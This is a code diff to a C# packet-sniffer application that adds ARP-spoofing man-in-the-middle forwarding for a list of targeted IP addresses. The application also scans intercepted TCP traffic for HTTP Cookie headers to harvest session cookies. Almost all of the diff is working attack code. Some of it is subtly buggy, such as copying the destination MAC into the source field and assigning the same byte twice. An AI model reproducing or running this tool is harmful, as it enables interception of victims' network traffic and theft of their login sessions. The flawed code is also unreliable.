@@ -15,54 +15,72 @@ using PacketDotNet;
 using System.Threading;
 namespace Sniffer
 {
-
-
+    
+   
     public partial class Main : Form
     {
-
+      //  BaseInformation.IpPacketHeader ipPacketHeader;
         CaptureDeviceList selectedDevices;
         BaseInformation baseInformation;
-      
+        PacketHeader packetHeader;
+
+
 
         public Main()
         {
             InitializeComponent();
-            selectedDevices = CaptureDeviceList.Instance; //전체 네트워크 디바이스 리스트를 가져온다 
+            selectedDevices = CaptureDeviceList.Instance;
             baseInformation = new BaseInformation();
+            packetHeader = new PacketHeader();
             baseInformation.getDefaultGateway();
-            setlistView();
+            baseInformation.getMyIpAddress();
+            setlistView();  
         }
+
+        struct Message
+        {
+            public int id;
+            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 50)]
+            public string text;
+        }
+
         private void Icd_OnPacketArrival(object sender, CaptureEventArgs e)
         {
+           
+          // ipPacketHeader
             IPAddress srcIP;
             IPAddress dstIP;
             StringBuilder sb_Site = new StringBuilder();
             StringBuilder sb_packetSender = new StringBuilder();
             Packet tcpPacket;
             TcpPacket Packetinfo;
-
+            
             RawCapture packet = e.Packet;
+            packetByteToStruct(packet.Data);
+            
 
-            //리다이렉트를 하는데
-            if (e.Packet.Data.Length < 29) return;      // 비정상적 패킷은 return한다
-            packet.Data[0] = 0x2c;                      // 패킷 리다이렉션을 위해 패킷을 하드코딩해서 실험중...
-            packet.Data[1] = 0x21;
-            packet.Data[2] = 0x72;
-            packet.Data[3] = 0x93;
-            packet.Data[4] = 0xdf;
-            packet.Data[5] = 0x00;
-            packet.Data[6] = 0x48;
-            packet.Data[7] = 0x45;
-            packet.Data[8] = 0x20;
-            packet.Data[9] = 0x81;
-            packet.Data[9] = 0x23;
-            packet.Data[10] = 0x8d;
-            var addr = IPAddress.Parse(packet.Data[26] + "." + packet.Data[27] + "." + packet.Data[28] + "." + packet.Data[29]);
-            if (BaseInformation.targetIpAddress == addr.ToString())
+            for (int i = 0; i < BaseInformation.attack_IP_list.Count; i++)
             {
-                BaseInformation.captureDevice.SendPacket(packet.Data);
+                if (BaseInformation.attack_IP_list[i].Equals(packetHeader.sourceIP))
+                {
+                    if (packetHeader.type == 1544) // 패킷이 arp일 경우는 arpspoofing 공격을 다시 시작한다.
+                    {
+                        MessageBox.Show("");
+                    }
+                    else                           //그 외의 모든 IP 패킷은 다시 전송한다. //보낼 때는 이더넷의 주소를 변경하여 보내준다
+                    {
+                        byte[] gatewayMac = BaseInformation.gatewayMac.Split('-').Select(x => Convert.ToByte(x, 16)).ToArray();
+                        byte[] myMac = BaseInformation.captureDevice.MacAddress.GetAddressBytes();
+
+                        for (int j = 0; j < 6; j++)
+                        {
+                            packet.Data[j] = gatewayMac[j];
+                            packet.Data[j + 6] = myMac[j];
+                        }
+                        BaseInformation.captureDevice.SendPacket(packet.Data);
+                    }
+                }
             }
-           
             try
             {
                 tcpPacket = Packet.ParsePacket(packet.LinkLayerType, packet.Data);
@@ -83,7 +101,41 @@ namespace Sniffer
             {
                 return;
             }
-            for (int i = 0; i < packet.Data.Length - 10; i++)
+            //////////////test/////////////////////////////
+            /*
+            {
+                ListViewItem lvi = new ListViewItem();
+                System.Text.StringBuilder sb_Cookie = new System.Text.StringBuilder();
+                System.Text.StringBuilder sb_SourceIp = new System.Text.StringBuilder();
+                sb_Cookie.Append("test1");
+                sb_SourceIp.Append("test2");
+
+                lvi.SubItems.Add(srcIP.ToString());
+                lvi.SubItems.Add(dstIP.ToString());
+                lvi.SubItems.Add(sb_Site.ToString());
+                lvi.SubItems.Add(sb_Cookie.ToString());
+                sb_Cookie.Clear();
+
+                if (listView.InvokeRequired)
+                    listView.Invoke(new MethodInvoker(delegate
+                    {
+                        listView.Items.Add(lvi);
+
+                    }));
+                else
+                    listView.Items.Add(lvi);
+
+            }
+            */
+
+
+
+
+
+
+
+            
+            for (int i = 0; i < packet.Data.Length - 10; i++)       //TCP에서 호스트와 쿠키만 빼온다
             {
                 if (packet.Data[i] == 'C' && packet.Data[i + 1] == 'o' && packet.Data[i + 2] == 'o' && packet.Data[i + 3] == 'k' && packet.Data[i + 4] == 'i' && packet.Data[i + 5] == 'e')
                 {
@@ -122,17 +174,41 @@ namespace Sniffer
         }
         private void btn_capture_option_Click(object sender, EventArgs e)
         {
-            SelectDevices selectedDeviceForm = new SelectDevices();
+            SelectDevices selectedDeviceForm = new SelectDevices();  
             if (selectedDeviceForm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
             {
                 BaseInformation.captureDevice = selectedDevices[selectedDeviceForm.returnDeviceIndex];  //선택한 네트워크 인터페이스를 가져온다.
+               
                 BaseInformation.captureDevice.Open(DeviceMode.Normal);  //선택한 네트워크 인터페이스를 오픈함
+               
                 BaseInformation.myMacAddress = BaseInformation.captureDevice.MacAddress.ToString(); //선택한 네트워크 인터페이스의 맥주소를 가져온다.
+                baseInformation.sendArpRequest();       //선택한 네트워크로 arp request를 전송한다.
             }
 
         }
+        private void packetByteToStruct(byte[] p)
+        {
+            for (int i = 0 ; i < 6 ; i++)
+                packetHeader.etherDest[i] = p[i];
+            for (int i = 0; i < 6; i++)
+                packetHeader.etherSource[i] = p[i];
+            packetHeader.type = BitConverter.ToUInt16(p, 12);
+            
+            packetHeader.totalLength = BitConverter.ToUInt16(p, 16);
+            packetHeader.identification = BitConverter.ToUInt16(p, 18);
+            packetHeader.fragmentOffset = p[20];
+            packetHeader.TTL = p[22];
+            packetHeader.protocol = p[23];
+            packetHeader.headerChecksum = BitConverter.ToUInt16(p, 24);
+            packetHeader.sourceIpAddress = BitConverter.ToUInt32(p, 26);
+            packetHeader.destIpAddress = BitConverter.ToUInt32(p, 30);
+            
+            packetHeader.sourceIP = new IPAddress(BitConverter.GetBytes(packetHeader.sourceIpAddress)).ToString();
+            packetHeader.destIP = new IPAddress(BitConverter.GetBytes(packetHeader.destIpAddress)).ToString();
 
-
+        }
+       
+       
         private void btn_capture_start_Click(object sender, EventArgs e)
         {
 
@@ -148,11 +224,11 @@ namespace Sniffer
             MessageBox.Show(test);
         }
 
-        private void btn_arp_attack_Click(object sender, EventArgs e)
+        private void btn_arp_attack_Click(object sender, EventArgs e)       
         {
             AttackList AttackListForm = new AttackList();
             AttackListForm.Show();
-
+   
         }
         private void setlistView()
         {
